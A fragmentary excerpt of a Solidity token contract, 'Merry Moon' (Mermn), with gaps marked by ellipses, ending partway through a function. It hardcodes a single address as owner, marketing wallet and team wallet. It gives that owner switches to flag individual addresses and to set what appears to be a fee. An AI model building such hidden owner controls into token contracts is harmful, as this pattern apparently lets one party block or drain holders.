...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x310968E537eFdba0EE9F122f28c14121151956f7;
        // owner address
...
contract Mermn is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "Merry Moon";
    string private _symbol = "Mermn";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0x310968E537eFdba0EE9F122f28c14121151956f7); // Marketing Address
    address payable public teamWalletAddress = payable(0x310968E537eFdba0EE9F122f28c14121151956f7); // Team Address
    ...
    function setDLMermn(address addr, bool bv) external onlyOwner {
        isDL[addr] = bv;
    }

    function setDEMermn(uint256 fe) external onlyOwner {
